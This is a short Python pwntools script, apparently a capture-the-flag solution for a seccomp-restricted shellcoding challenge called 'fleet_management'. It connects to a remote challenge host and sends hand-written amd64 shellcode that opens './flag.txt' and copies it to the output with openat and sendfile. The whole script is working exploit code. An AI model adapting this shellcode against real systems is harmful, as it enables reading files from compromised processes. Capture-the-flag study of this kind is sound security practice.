#!/usr/bin/env python3

#A classic shellcoding challenge but with seccomp to use only sigreturn,exit,exit_group,openat and sendfile
#But shellcode has to be under 60 bytes
#I used openat and sendfile syscall to solve the challenge

from pwn import *


context.arch = "amd64"
e = ELF("./fleet_management")
#r = process("./fleet_management")
r = remote("159.65.89.199",32619)
r.sendlineafter(b"[*] What do you want to do?",b"9")
shellcode = '''
mov rbx,0x007478742e67616c
push rbx
mov rbx,0x662f2f2f2f2f2f2e
push rbx
mov eax,257
mov rdi,-100
mov rsi,rsp
xor rdx,rdx
syscall               
mov rsi,rax
mov rdi,1
mov al,40
mov r10b,al
syscall
'''
#openat(-100,./flag.txt,0,0)
#sendfile(1,openat_return fd,0,40)
r.send(asm(shellcode))
r.interactive()
